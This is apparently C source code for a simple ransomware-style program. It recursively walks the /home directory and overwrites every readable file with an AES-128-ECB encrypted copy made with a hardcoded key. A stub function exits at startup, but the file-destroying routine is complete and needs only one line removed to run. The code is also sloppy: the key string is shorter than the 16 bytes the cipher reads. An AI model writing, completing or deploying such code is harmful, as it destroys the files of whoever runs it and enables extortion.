#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <stdint.h>

#include "AES/aes.h"

#ifdef DEBUG
#define DBG_LOG(__fmt__, ...) fprintf(stderr, __fmt__, ##__VA_ARGS__);

#else
#define DBG_LOG(...)
#endif

#define AES_SECRET_KEY "AES128_ECB_key"

#define TARGET_DIR  "/home"

#define AES_BLOCK_SIZE 16

typedef struct file_data
{
	uint8_t * data;
	long      size;
} file_data_t;

void plug()
{
	printf("You are trying to run a bad program on your system...\n");
	exit(0);
}

static int get_file_data(
		const char  * fname,
		file_data_t * fdata)
{
	int rcode = -1;

	FILE * f = fopen(fname, "rb");
	if (!f)
	{
		DBG_LOG("<%s> fopen(%s) failed: %s\n", __func__, fname, strerror(errno));
		// skip if open failed
		return 0;
	}

	if (fseek(f, 0, SEEK_END))
	{
		DBG_LOG("<%s:%d> fseek() failed: %s\n", __func__, __LINE__, strerror(errno));
		goto error;
	}

	fdata->size = ftell(f);
	if (-1 == fdata->size)
	{
		DBG_LOG("<%s> ftell() failed: %s\n", __func__, strerror(errno));
		goto error;
	}

	// empty file
	if (0 == fdata->size)
	{
		goto ret;
	}

	if (fseek(f, 0, SEEK_SET))
	{
		DBG_LOG("<%s:%d> fseek() failed: %s\n", __func__, __LINE__, strerror(errno));
		goto error;
	}

	while((fdata->size % AES_BLOCK_SIZE) != 0)
	{
		fdata->size++;
	}

	fdata->data = malloc(fdata->size);
	if (!fdata->data)
	{
		DBG_LOG("<%s> malloc() failed: %s\n", __func__, strerror(errno));
		goto error;
	}

	int rc = fread(fdata->data, sizeof(uint8_t), fdata->size, f);
	if ((rc < 0) || (rc > fdata->size))
	{
		DBG_LOG("<%s> fread() failed: %s\n", __func__, strerror(errno));
		goto error;
	}

ret:
	rcode = 0;
error:
	fclose(f);
	return rcode;
}

int save_file(
		const char  * fname,
		file_data_t * fdata)
{
	int rcode = -1;

	FILE * f = fopen(fname, "wb");
	if (!f)
	{
		DBG_LOG("<%s> fopen() failed: %s\n", __func__, strerror(errno));
		// skip if open failed
		return 0;
	}

	int rc = fwrite(fdata->data, sizeof(uint8_t), fdata->size, f);
	if ((rc < 0) || (rc > fdata->size))
	{
		DBG_LOG("<%s> fwrite() failed: %s\n", __func__, strerror(errno));
		goto error;
	}

	rcode = 0;
error:
	fclose(f);

	return rcode;
}

int encrypt_file(const char * fname)
{
	int rcode = -1;

	file_data_t fdata     = {.data = NULL, .size = 0};
	file_data_t out_fdata = {.data = NULL, .size = 0};

	if (get_file_data(fname, &fdata))
	{
		DBG_LOG("<%s> get_file_data() failed\n", __func__);
		goto error;
	}

	// empty file
	if (0 == fdata.size)
	{
		goto ret;
	}

	out_fdata.size = fdata.size;

	out_fdata.data = calloc(1, out_fdata.size);
	if (!out_fdata.data)
	{
		DBG_LOG("<%s> malloc() failed: %s\n", __func__, strerror(errno));
		goto error;
	}

	for (int i = 0; i < fdata.size; i += AES_BLOCK_SIZE)
	{
		AES_ECB_encrypt(fdata.data + i, (uint8_t *) AES_SECRET_KEY, out_fdata.data + i, AES_BLOCK_SIZE);
		//AES_ECB_decrypt(fdata.data + i, (uint8_t *) AES_SECRET_KEY, out_fdata.data + i, AES_BLOCK_SIZE);
	}

	if (save_file(fname, &out_fdata))
	{
		DBG_LOG("<%s> save_file() failed\n", __func__);
		goto error;
	}

ret:
	rcode = 0;
error:
	free(fdata.data);
	free(out_fdata.data);

	return rcode;
}

int run(const char * dir_name)
{
	int rcode = 0;

	DIR * dir = opendir(dir_name);
	if (!dir && (EACCES == errno))
	{
		goto ret;
	}
	else if (!dir)
	{
		DBG_LOG("<%s> opendir() failed: %s\n", __func__, strerror(errno));
		return -1;
	}

	int rc = chdir(dir_name);
	if ((-1 == rc) && (EACCES == errno))
	{
		goto ret;
	}
	else if (-1 == rc)
	{
		DBG_LOG("<%s> chdir(%s) failed: %s\n", __func__, dir_name, strerror(errno));
		goto error;
	}

	while (1)
	{
		struct dirent * entry = readdir(dir);
		if (!entry)
		{
			if (chdir(".."))
			{
				DBG_LOG("<%s> chdir(..) failed: %s\n", __func__, strerror(errno));
				goto error;
			}

			goto ret;
		}

		DBG_LOG("%s\n", entry->d_name);

		if (DT_DIR == entry->d_type)
		{
			if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
				continue;

			if (run(entry->d_name))
			{
				DBG_LOG("<%s> failed on (%s)-(%s)\n", __func__, dir_name, entry->d_name);
				goto error;
			}
		}

		if ((DT_DIR != entry->d_type) && encrypt_file(entry->d_name))
		{
			DBG_LOG("encrypt_file(%s) failed\n", entry->d_name);
			goto error;
		}
	}

error:
	rcode = -1;
ret:
	closedir(dir);

	return rcode;
}

int main(int argc, char ** argv)
{
	plug();

	printf("Something terrible is happening...\n");

	if (run(TARGET_DIR))
	{
		DBG_LOG("<%s> run() failed\n", __func__);
		return -1;
	}

	return 0;
}
